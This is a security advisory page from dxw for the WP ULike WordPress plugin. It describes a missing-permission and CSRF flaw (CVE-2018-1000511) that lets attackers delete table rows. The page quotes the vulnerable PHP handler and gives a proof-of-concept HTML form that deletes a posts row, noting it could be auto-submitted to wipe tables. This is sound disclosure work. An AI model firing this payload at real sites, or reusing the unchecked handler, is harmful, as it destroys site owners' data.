<!DOCTYPE html>
<!--[if IE 8]>         <html class="no-js lt-ie9 lt-ie10" lang="en-US" data-nonce-fetch-plugin-details="7fafc5c67c" > <![endif]-->
<!--[if IE 9]>         <html class="no-js lt-ie10" lang="en-US" data-nonce-fetch-plugin-details="7fafc5c67c" > <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js" lang="en-US" data-nonce-fetch-plugin-details="7fafc5c67c" > <!--<![endif]-->
<head>
    <meta charset="utf-8">

    <title>WP ULike allows anybody to delete any row in certain tables &#8211; dxw advisories</title>
<meta name='robots' content='max-image-preview:large' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://advisories.dxw.com/wp-includes/css/dist/block-library/style.min.css?ver=5.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpt-twitter-feed-css'  href='https://advisories.dxw.com/wp-content/plugins/wp-to-twitter/css/twitter-feed.css?ver=5.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='main-css'  href='https://advisories.dxw.com/wp-content/themes/dxw-security-2017/static/main.min.css?ver=5.8.1' type='text/css' media='all' />
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="apple-touch-icon-precomposed" href="https://advisories.dxw.com/wp-content/themes/dxw-security-2017/static/img/apple-touch-icon-precomposed.png">

        <link rel="icon" type="image/png" href="https://advisories.dxw.com/wp-content/themes/dxw-security-2017/static/img/shortcut-icon.png">
        <script type='text/javascript' src='https://advisories.dxw.com/wp-content/themes/dxw-security-2017/static/lib/jquery.min.js?ver=5.8.1' id='jquery-js'></script>
<script type='text/javascript' src='https://advisories.dxw.com/wp-content/themes/dxw-security-2017/static/lib/modernizr.min.js?ver=5.8.1' id='modernizr-js'></script>
<link rel="canonical" href="https://advisories.dxw.com/advisories/wp-ulike-delete-rows/" />
        <link rel="alternate" type="application/atom+xml" title="dxw advisories Feed" href="https://advisories.dxw.com/feed/">
                  <link rel="alternate" type="application/atom+xml" title="dxw advisories Advisory Feed" href="https://advisories.dxw.com/advisories/feed/">
          <link rel="alternate" type="application/atom+xml" title="dxw advisories Plugin Feed" href="https://advisories.dxw.com/plugins/feed/">
        </head>
<body class="advisories-template-default single single-advisories postid-3425">

    <!--[if lt IE 9]><div class="alert">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</div><![endif]-->

    <header class="global-header" role="banner">
    <div class="row">
        <div class="logo">
            <a href="https://advisories.dxw.com"><h1>dxw advisories</h1></a>
        </div>
        <nav class="header-navigation" role="navigation">
    <button type="button" id="js-navigation-toggle" class="navigation-toggle visible-min-width">
        <span class="sr-only">Menu</span>
        <!--[if gte IE 9]><!-->
        <svg id="menu" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 8"><path fill="#333" class="st0" d="M1.5 1.8c-.2 0-.4-.1-.5-.3S.8 1.2.8 1s0-.4.2-.5.3-.2.5-.2h9c.2 0 .4.1.5.2s.2.3.2.5 0 .4-.2.5-.3.2-.5.2h-9zm9 1.4c.2 0 .4.1.5.2s.2.3.2.5 0 .5-.2.6-.3.2-.5.2h-9c-.2.1-.4 0-.5-.2S.8 4.2.8 4s0-.4.2-.5.3-.2.5-.2h9zm0 3c.2 0 .4.1.5.2s.2.3.2.5 0 .5-.2.6-.3.2-.5.2h-9c-.2.1-.4 0-.5-.2S.8 7.2.8 7s0-.4.2-.5.3-.2.5-.2h9z"/></svg>
        <!--<![endif]-->
    </button>
    <div class="menu-header"><ul id="menu-header-menu" class="menu"><li id="menu-item-21" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-21"><a href="/advisories/">Advisories</a></li>
<li id="menu-item-20" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20"><a href="/plugins/">Plugins</a></li>
<li id="menu-item-24" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24"><a href="https://advisories.dxw.com/about/">About</a></li>
</ul></div></nav>
    </div>
</header>
    <main class="main" role="main">
        <section class="page-header-panel">
    <header class="row">
        <h2>Advisory:</h2>
        <h1>WP ULike allows anybody to delete any row in certain tables</h1>
    </header>
</section>

<section class="inspection-introduction">
    <div class="row">
        <div class="inspection-container">
            <header>
                <h2>Vulnerability</h2>
                <p class="review">Last revised: <time class="published" datetime="2018-05-14T14:01:02+00:00">May 14, 2018</time></p>
            </header>
            <div class="vulnerability-description rich-text">
                <p>The plugin contains a wp_ajax action which allows any authenticated user (it doesn&#8217;t check permissions) to delete any row of certain tables (the table must begin with <code>$wpdb-&gt;prefix</code> and contain an <code>id</code> field). As nonces are not used, this is also vulnerable to CSRF meaning unauthenticated users can access it if they can successfully phish any user of the site.</p>
<pre>add_action('wp_ajax_ulikelogs','wp_ulike_logs_process');
function wp_ulike_logs_process(){
  global $wpdb;
  $id = $_POST['id'];
  $table = $_POST['table'];
  $wpdb-&gt;delete( $wpdb-&gt;prefix.$table ,array( 'id' =&gt; $id ));
  wp_die();
}</pre>
<p>This functionality should have a nonce, it should be restricted to users with certain permissions, and it should be restricted to only allow deleting from certain tables.</p>
                <p class="state fixed">Current state:
                    <span class="green">                    Fixed</span>
                </p>
            </div>
        </div>
    </div>
</section>

<div class="row">
    <section class="page-section inspection-content">
                <article class="cvss-table">
            <h2>CVSS Summary</h2>
            <table class="cvss">
                <caption>CVSS base scores for this vulnerability</caption>
                <tbody>
                    <tr>
                        <th scope="col">Score</td>
                        <td class="score medium">5.8 Medium</td>
                    </tr>
                    <tr>
                        <th scope="col">Vector</th>
                        <td>Network</td>
                    </tr>
                    <tr>
                        <th scope="col">Complexity</th>
                        <td>Medium</td>
                    </tr>
                    <tr>
                        <th scope="col">Authentication</th>
                        <td>None</td>
                    </tr>
                    <tr>
                        <th scope="col">Confidentiality</th>
                        <td>None</td>
                    </tr>
                    <tr>
                        <th scope="col">Integrity</th>
                        <td>Partial</td>
                    </tr>
                    <tr>
                        <th scope="col">Availability</th>
                        <td>Partial</td>
                    </tr>
                </tbody>
            </table>
            <small>You can read more about CVSS base scores on <a href="http://en.wikipedia.org/wiki/CVSS">Wikipedia</a> or in the <a href="http://www.first.org/cvss/cvss-guide">CVSS specification</a>.</small>
        </article>
                
        <article class="report">
            <h2>Proof of concept</h2>
            <div class="rich-text">
                <p>This is the proof-of-concept for an unauthenticated user using CSRF against a logged in user.</p>
<ol>
<li>Activate the plugin</li>
<li>Remain signed in</li>
<li>Visit a page containing the HTML below</li>
<li>Press submit</li>
<li>Row with <code>id=1</code> in the <code>$wpdb-&gt;prefix.'posts'</code> table will be deleted</li>
<li>The value of id or table can be changed allowing deleting any row in any table with the WordPress prefix at the start of its name, and having an id column</li>
</ol>
<pre>&lt;form method="POST" action="http://localhost/wp-admin/admin-ajax.php"&gt;
 &lt;input type="text" name="action" value="ulikelogs"&gt;
 &lt;input type="text" name="table" value="posts"&gt;
 &lt;input type="text" name="id" value="1"&gt;
 &lt;input type="submit"&gt;
&lt;/form&gt;</pre>
<p>In a real attack, the form could be made to auto-submit on page load, and submit the form multiple times with different table and id values meaning that a single user falling for a phish could wipe entire tables.</p>
            </div>
        </article>

        <article class="report">
            <h2>Advisory timeline</h2>
            <div class="rich-text">
                <ul>
<li>2017-10-18: Discovered</li>
<li>2018-04-16: Reported to plugin author via contact form</li>
<li>2018-04-23: Vendor reported fixed in 3.2 (first reply)</li>
<li>2018-05-14: Advisory published</li>
<li>2018-05-17: Advisory amended based on <a href="https://www.pluginvulnerabilities.com/2018/05/16/dxw-overstating-risk-of-vulnerabilities-in-wordpress-plugins/">feedback</a> (we erroneously said &#8220;any WordPress table&#8221; when only 2 WordPress tables have <code>ID</code> columns)</li>
<li>2018-06-07: CVE requested</li>
<li>2018-06-23: CVE assigned</li>
</ul>
            </div>
        </article>

        <article class="report">
            <h2>Mitigation/further actions</h2>
            <div class="rich-text">
                <p>Upgrade to version 3.2 or later.</p>
            </div>
        </article>

        
    </section>

    <aside class="sidebar page-section">
        <section>
            <dl class="inspection-details">
                <dt>Discovered by:</dt>
                <dd>Mallory Adams and dxwsupport</dd>

                <dt>Advisory ID:</dt>
                                                    <dd>dxw-2017-3425</dt>
                
                <dt>CVE:</dt>
                                    <dd>CVE-2018-1000511</dd>
                
                <dt>Component/package:</dt>
                <dd>WP ULike</dd>

                                    <dt>Homepage:</dt>
                    <dd><a href="https://wordpress.org/plugins/wp-ulike/">WP ULike</a></dd>
                
                <dt>Version:</dt>
                <dd>2.8.1,3.1</dd>
            </dl>
        </section>
            </aside>
</div>

    </main>

    <footer class="global-footer" role="contentinfo">
    <div class="row">
        <div class="global-footer-links">
            <section class="footer-contact">
                <h5>Contact</h5>
                <div itemscope itemtype="http://schema.org/Organization">
                     <span itemprop="name">dxw advisories</span>
                     <div itemprop="address" itemscope itemtype="http://schema.org/PostalAddress">
                        <span itemprop="streetAddress">Calls Landing</span>
                        <span itemprop="streetAddress">36-38 The Calls</span>
                        <span itemprop="addressLocality">Leeds</span>,
                        <span itemprop="postalCode">LS2 7EW</span>
                     </div>
                     <span itemprop="telephone"><a href="tel:0345-257-7520"><span class="sr-only">Call us on </span>0345 257 7520</a></span>
                     <span itemprop="email"><a href="mailto:contact@govpress.com">contact@dxw.com</a></span>
                </div>
            </section>

                            <section>
                    <h5>Services</h5><ul id="menu-services" class="menu"><li id="menu-item-3527" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3527"><a href="https://advisories.dxw.com/about/plugin-reviews/">Plugin reviews</a></li>
<li id="menu-item-3528" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3528"><a href="https://advisories.dxw.com/about/plugin-inspections/">Plugin inspections</a></li>
<li id="menu-item-3514" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3514"><a href="https://advisories.dxw.com/disclosure/">Responsible disclosure policy</a></li>
<li id="menu-item-3515" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3515"><a href="https://advisories.dxw.com/terms/">Terms of service</a></li>
</ul>                </section>
            
                            <section>
                    <h5>Github</h5><ul id="menu-github" class="menu"><li id="menu-item-3510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3510"><a href="https://github.com/dxw/whippet">Whippet</a></li>
<li id="menu-item-3512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3512"><a href="https://github.com/dxw/2fa">2FA Plugin</a></li>
<li id="menu-item-3513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3513"><a href="https://github.com/dxw/iguana">Iguana</a></li>
</ul>                </section>
            
                            <section>
                    <h5>More from dxw</h5><ul id="menu-more-from-dxw" class="menu"><li id="menu-item-3518" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3518"><a href="https://www.dxw.com">dxw</a></li>
<li id="menu-item-3535" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3535"><a href="https://www.tradecraft.com/">Tradecraft</a></li>
</ul>                </section>
                    </div>
        <div class="global-footer-border">
            <hr>
        </div>
    </div>
    <div class="row global-footer-certificates">
        <p></p>
        <div class="badges">
            <img src="https://advisories.dxw.com/wp-content/themes/dxw-security-2017/static/img/ci-ukas.png" alt="UKAS Certification International" class="badge ukas">
            <img src="https://advisories.dxw.com/wp-content/themes/dxw-security-2017/static/img/ccs-certificate.png" alt="Government Procurement Service" class="badge ccss">
            <img src="https://advisories.dxw.com/wp-content/themes/dxw-security-2017/static/img/cyber-essentials.png" alt="Cyber Essentials" class="badge cyber">
        </div>
    </div>

    <div class="global-footer-copyright">
        <div class="row">
            <div class="footer-social">
                <ul>
                    <li>
                        <a href="https://twitter.com/dxw" class="twitter">
                            <!--[if gte IE 9]><!-->
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144 144"><title>Twitter</title><path fill="#eeeeee" d="M107,54V56.4c0,23.85-18.13,51.35-51.3,51.35-10.18,0-19.77-2.23-27.71-7.35a28.5,28.5,0,0,0,4.3.3c8.42,0,16.29-3.65,22.39-8.55a18,18,0,0,1-16.8-12.55,17.74,17.74,0,0,0,3.35.34A18.05,18.05,0,0,0,46,79.3,18,18,0,0,1,31.57,61.6v-.21a18.1,18.1,0,0,0,8.16,2.23,18,18,0,0,1-8.08-15A17.2,17.2,0,0,1,34.1,39.9,51.31,51.31,0,0,0,71.27,58.42a18.81,18.81,0,0,1-.39-4.17,18,18,0,0,1,18-18,18.68,18.68,0,0,1,13.28,5.67,36.24,36.24,0,0,0,11.39-4.38,17.9,17.9,0,0,1-7.95,10A35.21,35.21,0,0,0,116,44.67,36.57,36.57,0,0,1,107,54Z"/></svg>
                            <!--<![endif]-->
                            <span>Twitter</span>
                        </a>
                    </li>
                    <li>
                        <a href="https://www.facebook.com/thedxw/" class="facebook">
                            <!--[if gte IE 9]><!-->
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144 144"><title>Facebook</title><path fill="#eeeeee" d="M61.6,50c0,1.9,0,10.4,0,10.4H54V73h7.6v37.7h15.6V73h10.5c0,0,1-6.1,1.5-12.7 c-1.4,0-11.9,0-11.9,0s0-7.4,0-8.7s1.7-3,3.4-3s5.2,0,8.5,0c0-1.7,0-7.7,0-13.2c-4.4,0-9.4,0-11.6,0C61.2,35.4,61.6,48.1,61.6,50z"/></svg>
                            <!--<![endif]-->
                            <span>Facebook</span>
                        </a>
                    </li>
                    <li>
                        <a href="https://www.linkedin.com/company/dxw" class="linkedin">
                            <!--[if gte IE 9]><!-->
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144 144"><title>LinkedIn</title><path fill="#eeeeee" d="M110.5,80.7v28.7H93.9V82.7c0-6.7-2.4-11.3-8.4-11.3c-4.6,0-7.3,3.1-8.5,6.1 c-0.4,1.1-0.6,2.6-0.6,4.1v27.9H59.8c0,0,0.2-45.3,0-50h16.6v7.1c0,0.1-0.1,0.1-0.1,0.2h0.1v-0.2c2.2-3.4,6.1-8.3,15-8.3 C102.3,58.3,110.5,65.4,110.5,80.7z M42.4,35.3c-5.7,0-9.4,3.7-9.4,8.6c0,4.8,3.6,8.6,9.2,8.6h0.1c5.8,0,9.4-3.8,9.4-8.6 C51.6,39.1,48.1,35.3,42.4,35.3z M34,109.4h16.6v-50H34V109.4z"/></svg>
                            <!--<![endif]-->
                            <span>LinkedIn</span>
                        </a>
                    </li>
                    <li>
                        <a href="https://github.com/dxw" class="github">
                            <!--[if gte IE 9]><!-->
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144 144"><title>GitHub</title><path fill="#eeeeee" d="M116,73.72c0,25.78-16.5,34.93-44,34.93S28,99.5,28,73.85a28.91,28.91,0,0,1,6.4-18.43c-.9-4.9-1.8-13.36.95-20.07a36,36,0,0,1,19.12,7.73A68.19,68.19,0,0,1,72,40.85a66.44,66.44,0,0,1,17.4,2.23,37,37,0,0,1,19.25-7.73c2.75,6.62,1.85,15.17.95,19.94A29.17,29.17,0,0,1,116,73.72ZM104.4,84.85c0-12.85-10.4-15.6-15.9-15.6s-5.5.9-16.5.9-11-.9-16.5-.9S39.6,72,39.6,84.85c0,11,8.55,18.3,32.4,18.3S104.4,95.85,104.4,84.85Zm-41.55.9c0,6.4-2.06,8.25-4.6,8.25s-4.6-1.85-4.6-8.25,2.06-8.25,4.6-8.25S62.85,79.35,62.85,85.75Zm27.5,0c0,6.4-2.06,8.25-4.6,8.25s-4.6-1.85-4.6-8.25,2.06-8.25,4.6-8.25S90.35,79.35,90.35,85.75Z"/></svg>
                            <!--<![endif]-->
                            <span>GitHub</span>
                        </a>
                    </li>
                </ul>
            </div>
            <div class="footer-legal">
                <p>&copy; 2008 &ndash; 2021. The Dextrous Web Ltd, trading as dxw. &#8220;dxw&#8221; is a registered trademark. All rights reserved. The Dextrous Web Ltd is a company registered in England &amp; Wales, No. 6617101. Registered address Calls Landing, 36-38 The Calls, Leeds, LS2 7EW.</p>
            </div>
        </div>
    </div>
</footer>

            <script type="text/javascript">
            var _gaq = _gaq || [];
            var TRACKING_CODE = 'UA-29555961-5'; // Put the Google Analytics tracking code here
            _gaq.push(['_setAccount', TRACKING_CODE]);
            _gaq.push(['_trackPageview']);
            if (!TRACKING_CODE.length) {
              console.warn('Google Analytics requires a tracking code to function correctly');
            }

            (function() {
                var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
            })();
        </script>
        <script type='text/javascript' src='https://advisories.dxw.com/wp-content/themes/dxw-security-2017/static/main.min.js?ver=5.8.1' id='main-js'></script>
<script type='text/javascript' src='https://advisories.dxw.com/wp-includes/js/wp-embed.min.js?ver=5.8.1' id='wp-embed-js'></script>
</body>
</html>
